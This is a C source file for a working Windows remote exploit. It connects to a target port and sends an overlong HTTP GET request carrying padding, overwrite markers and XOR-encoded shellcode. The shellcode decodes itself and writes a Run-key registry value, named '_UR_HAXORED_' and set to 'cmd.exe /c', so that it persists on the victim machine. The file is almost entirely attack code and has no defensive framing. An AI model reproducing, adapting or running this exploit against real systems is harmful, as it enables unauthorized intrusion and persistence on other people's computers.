#include "windows.h"
#include "stdio.h"
#include "winsock.h"

#define TARGET_PORT 224
#define TARGET_IP "127.0.0.1"

char aSendBuffer[] =
        "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        "AAAAAAAAAAABBBBAAAACCCCAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
        "AAAAAAAAAAAAAAAAAAAAAAAAAAADDDDAAAAEEEEAAAAAAAAAAA" \
        //mov           eax, 0x12ED21FF
        //sub           al, 0xFF
        //rol           eax, 0x018
        //mov           ebx, eax
        "\xB8\xFF\x1F\xED\x12\x2C\xFF\xC1\xC0\x18\x8B\xD8" \
        //              xor     ecx, ecx
        //              mov ecx, 0x46
        //LOOP_TOP:
        //              dec             eax
        //              xor             [eax], 0x80
        //              dec             ecx
        //              jnz             LOOP_TOP (75 F9)
        "\x33\xC9\xB1\x46\x48\x80\x30\x80\x49\x75\xF9" \

        //push  ebx
        "\x53" \

        //mov   eax, 77787748
        //mov   edx, 77777777

        "\xB8\x48\x77\x78\x77" \
        "\xBA\x77\x77\x77\x77" \

        //xor   eax, edx
        //push  eax
        "\x33\xC2\x50" \

        //xor   eax, eax
        //push  eax
        "\x33\xC0\x50" \

        // mov  eax, 0x77659BAe
        // xor  eax, edx
        // push eax
        "\xB8\xAE\x9B\x65\x77\x33\xC2\x50"

        //mov   eax, F7777775
        //xor   eax, edx
        //push  eax
        "\xB8\x75\x77\x77\xF7" \
        "\x33\xC2\x50" \

        //mov   eax, 7734A77Bh
        //xor   eax, edx
        //call  [eax]
        "\xB8\x7B\xA7\x34\x77" \
        "\x33\xC2" \
        "\xFF\x10" \

        //mov   edi, ebx
        //mov   eax, 0x77659A63
        //xor   eax, edx
        //sub   ebx, eax
        //push  ebx
        //push  eax
        //push  1
        //xor   ecx, ecx
        //push  ecx
        //push  eax
        //push  [edi]
        //mov   eax, 0x7734A777
        //xor   eax, edx
        //call  [eax]
        "\x8B\xFB" \
        "\xBA\x77\x77\x77\x77" \
        "\xB8\x63\x9A\x65\x77\x33\xC2" \
        "\x2B\xD8\x53\x50" \
        "\x6A\x01\x33\xC9\x51" \
        "\xB8\x70\x9A\x65\x77" \
        "\x33\xC2\x50" \
        "\xFF\x37\xB8\x77\xA7\x34" \
        "\x77\x33\xC2\xFF\x10" \

        // halt or jump to somewhere harmless
        "\xCC" \
        "AAAAAAAAAAAAAAA" \

        // nop (int 3) 92
        // nop (int 3)
        // jmp
        "\x90\x90\xEB\x80\xEB\xD9\xF9\x77" \
        /* registry key path "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" */
        "\xDC\xD3\xCF\xC6\xD4\xD7\xC1\xD2\xC5\xDC\xCD\xE9\xE3\xF2" \
        "\xEF\xF3\xEF\xE6\xF4\xDC\xD7\xE9\xEE\xE4\xEF\xF7\xF3\xDC\xC3" \
        "\xF5\xF2\xF2\xE5\xEE\xF4\xD6\xE5\xF2\xF3\xE9\xEF\xEE\xDC" \
        "\xD2\xF5\xEE\x80" \
        /* value name "_UR_HAXORED_" */
        "\xDF\xD5\xD2\xDF\xC8\xC1\xD8\xCF\xD2\xC5\xC4\xDF\x80" \
        /* the command "cmd.exe /c" */
        "\xE3\xED\xE4\xAE\xE5\xF8\xE5\xA0\xAF\xE3\x80\x80\x80\x80\x80";

int main(int argc, char* argv[])
{
        WSADATA wsaData;
        SOCKET s;
        SOCKADDR_IN sockaddr;

        sockaddr.sin_family = AF_INET;
        if(3 == argc)
        {
                int port = atoi(argv[2]);
                sockaddr.sin_port = htons(port);
        }
        else
        {
                sockaddr.sin_port = htons(TARGET_PORT);
        }
        if(2 <= argc)
        {
                sockaddr.sin_addr.S_un.S_addr = inet_addr(argv[2]);
        }
        else
        {
                sockaddr.sin_addr.S_un.S_addr = inet_addr(TARGET_IP);
        }

        try
        {
                WSAStartup(MAKEWORD(2,0), &wsaData);
                s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if(INVALID_SOCKET == s)
                        throw WSAGetLastError();
                if(SOCKET_ERROR == connect(s, (SOCKADDR *)&sockaddr, sizeof(SOCKADDR)) )
                        throw WSAGetLastError();
                send(s, aSendBuffer, strlen(aSendBuffer), 0);
                closesocket(s);
                WSACleanup();
        }
        catch(int err)
        {
                fprintf(stderr, "error %d\n", err);
        }
        return 0;
}